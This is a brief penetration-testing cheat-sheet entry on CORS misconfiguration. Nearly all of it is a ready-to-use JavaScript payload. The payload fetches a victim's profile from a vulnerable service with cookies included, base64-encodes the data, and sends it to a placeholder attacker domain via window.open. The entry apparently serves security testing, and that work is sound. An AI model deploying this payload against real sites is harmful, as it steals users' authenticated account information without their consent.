# CORS Misconfiguration

## Table of Contents
- [Data Exfiltration](#data-exfiltration)

## Data Exfiltration

### Sensitive user data can be exfiltrated.

- Account information exposure
   ```html
    <script>
    (async () => {
    const response = await fetch('https://[VULNERABLE-SERVICE]/profile', {
        method: 'GET',
        credentials: 'include'
    });

    const data = await response.json();
    const base64 = btoa(JSON.stringify(data));

    const targetUrl = `https://[ATTACKER-DOMAIN]/?response=${encodeURIComponent(base64)}`;
    window.open(targetUrl, '_blank');
    })();
    </script>
   ```